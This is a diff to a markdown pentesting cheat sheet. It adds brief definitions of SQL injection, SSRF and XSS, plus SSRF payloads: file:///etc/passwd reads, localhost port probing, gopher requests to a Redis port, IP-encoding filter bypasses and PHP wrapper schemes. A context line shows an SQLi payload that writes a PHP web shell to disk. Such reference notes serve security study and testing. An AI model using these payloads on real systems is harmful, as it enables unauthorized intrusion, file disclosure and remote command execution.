@@ -720,6 +720,8 @@ https://www.secjuice.com/osint-detecting-enumerating-firewalls-gateways/
 
 ## injection
 ### sqli
+*when an attacker is able to manipulate queries which an application makes to a database*
+
 ```bash
 https://websec.wordpress.com/tag/sql-filter-bypass/  
 
@@ -747,8 +749,53 @@ union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE
 
 ```
 
+### ssrf
+*vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location*
+
+```bash
+# It is possible to prove the vulnerability by reading local files
+# Using the file protocol
+url=file:///etc/passwd
+
+# Then you can enumerate local services that are listening
+# Depending on the response
+http://localhost:<port>
+
+# It is also possible to use others protocols like gopher and dict
+# They don't send HTTP headers and can avoid misinterpretation
+gopher://127.0.0.1:6379/test
+
+# Filter bypass
+http://127.1 instead of http://127.0.0.1
+http://0 instead of http://localhost
+http://0xC0A80001 or http://3232235521 => 192.168.0.1
+192.168.516 => 192.168.2.4
+
+# php wrappers
+gopher://
+fd://
+expect://
+ogg://
+tftp://
+dict://
+ftp://
+ssh2://
+file://
+http://
+https://
+imap://
+pop3://
+mailto://
+smtp://
+telnet://
+```
+
+
+
 
 ### xss 
+*an attack where malicious scripts are injected into a web application and sent to a different user. typically used to steal cookies or session tokens, they can also go so far as to rewrite the content of the HTML page.*
+
 filter evasion
 https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
 
